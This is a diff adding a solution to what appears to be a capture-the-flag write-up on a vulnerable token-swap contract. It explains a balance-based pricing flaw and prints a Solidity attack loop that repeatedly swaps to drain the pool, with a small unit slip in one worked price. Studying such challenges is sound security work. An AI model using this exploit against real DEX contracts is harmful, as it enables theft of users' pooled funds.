@@ -1465,9 +1465,64 @@ IERC20(token1).balanceOf(_instance) == 0 || ERC20(token2).balanceOf(_instance) =
 
 ### Solution
 
-???
+The key in this problem is to understand this function
+
+```solidity
+function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+}
+```
+
+Let's see some trades:
+
+* On t = 0
+  * Player has 10 `token_1`, 10 `token_2`.
+  * Dex has 100 `token_1`, 100 `token_2`.
+
+* On t = 1
+  * Player wants to swap `token_1` for `token_2`, sends 10 `token_1` to dex.
+  * Dex computes the price, it is 100 `token_2` / 100 `token_1` = `1`.
+  * Dex receives the 10 `token_1`, now it has 100 + 10 = 110 `token_1`.
+  * Dex sends 10 * 1 = 10 `token_2`, now it has 100 - 10 = 90 `token_2`.
+  * Player receives the 10 `token_2`, now it has 10 + 10 = 20 `token_2`.
+
+* On t = 2
+  * Player wants to swap `token_2` for `token_1`, sends 20 `token_2` to dex.
+  * Dex computes the price, it is 110 `token_1` / 90 `token_1` = `1.22`.
+  * Dex receives the 20 `token_2`, now it has 90 + 20 = 110 `token_2`.
+  * Dex sends 20 * 1.22 = 24 `token_1`, now it has 110 - 24 = 86 `token_1`.
+  * Player receives the 24 `token_1`, now it has 0 + 24 = 24 `token_1`.
+
+We can see that if the player just keeps swapping, they will deplete the dex of all its tokens!
+
+Then an attack could be
+
+```solidity
+function attack(IDex dex) public {
+  address from = dex.token1();
+  address to = dex.token2();
+  uint256 swapAmount;
+
+  // keep swapping until we deplete either token in the dex
+  while (dex.balanceOf(to,   address(dex)) != 0 &&
+         dex.balanceOf(from, address(dex)) != 0) {
+
+    // control to avoid the "Not enough to swap" error
+    swapAmount = min(
+      dex.balanceOf(from, address(this)),
+      dex.balanceOf(from, address(dex))
+    );
+
+    dex.swap(from, to, swapAmount);
+    (from, to) = swapAddresses(from, to);
+  }
+}
+```
+
+With `min()` and `swapAddresses()` convenience functions.
 
 ### References
 
 * https://eips.ethereum.org/EIPS/eip-20
 * https://docs.openzeppelin.com/contracts/4.x/erc20
+* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
